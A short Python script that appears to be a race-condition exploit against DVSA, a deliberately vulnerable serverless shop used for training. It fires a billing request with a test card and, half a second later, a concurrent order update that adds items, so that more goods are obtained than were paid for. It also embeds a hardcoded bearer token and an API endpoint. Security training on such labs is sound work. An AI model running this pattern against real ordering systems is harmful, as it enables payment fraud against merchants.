import threading
import requests
import time

ORDER_ID = "71b6b166-5927-4598-9fe6-dc944ce35d32"
TOKEN = "eyJraWQiOiIrd2hTcWlKR0JxNFJBZ3NOMTJhXC96YzAyMjg1S01SZTRpbjFiMEVRUHpFUT0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxNGU4ZTQ1OC1iMGExLTcwMTEtOTU2NC00ZDU2M2EzMGM5NTgiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9QeHFDelFERGIiLCJjbGllbnRfaWQiOiI3NnRvbjluZmhtZG45a291OGRhb3ZrMGpndiIsIm9yaWdpbl9qdGkiOiJkN2FkMzUzOS1iODEwLTQxZDMtYTM4MC1mZGRhZmJjMzdhNDgiLCJldmVudF9pZCI6IjQ2OGVlNTlmLTFmNzktNDAwMy1iNmRiLTFjNTUzZmVkNzIwYSIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3NzcwNTc5MTMsImV4cCI6MTc3NzA2MTUxMywiaWF0IjoxNzc3MDU3OTEzLCJqdGkiOiIzMzFlZDcxNS00YzJiLTRhMGItYThlZi1jOTYyMjU3MTgwYzgiLCJ1c2VybmFtZSI6IjE0ZThlNDU4LWIwYTEtNzAxMS05NTY0LTRkNTYzYTMwYzk1OCJ9.NHAtpCiBzlbhOKfIrgVAcpSF9zscf6vz9zWU3QVoVjTx8QHKSpJNa3x1vJyNz3MoF0HXcnYda5EQ_Se5nVujnPvx16cSHZZ_r-5sHIKzC4J6APW_RpcYai2ipamziPCsmCa4g_0KGFPnKaVVUXMeLpGqNe8eidgYdKQ7LqKn85bLmOYcf_n38I56qPml0p3cGvY3-Y84f-15Rh9DJj0AbXIfzUwmFid_U0JdGJj74TJdFnhOecXH8QET1PEFXUPNcMw1mrL8upvRjWCtQwh9D8XCKw7v8lc3lf5GwtcwwZNHsVX7obOcjX50U1g4H4hwpY5MljNy0znjn2YcssRfnw"
URL = "https://9v3sovt0ed.execute-api.us-east-1.amazonaws.com/dvsa/order"
headers = {"Authorization": TOKEN, "Content-Type": "application/json"}

def billing():
    payload = '{"action":"billing","order-id":"' + ORDER_ID + '","data":{"ccn":"4242424242424242","exp":"12/26","cvv":"123"}}'
    r = requests.post(URL, data=payload, headers=headers)
    print("BILLING:", r.text)

def update():
    time.sleep(0.5)  
    payload = '{"action":"update","order-id":"' + ORDER_ID + '","items":{"1013":5}}'
    r = requests.post(URL, data=payload, headers=headers)
    print("UPDATE:", r.text)

t1 = threading.Thread(target=billing)
t2 = threading.Thread(target=update)

t1.start()
t2.start()

t1.join()
t2.join()

print("DONE!")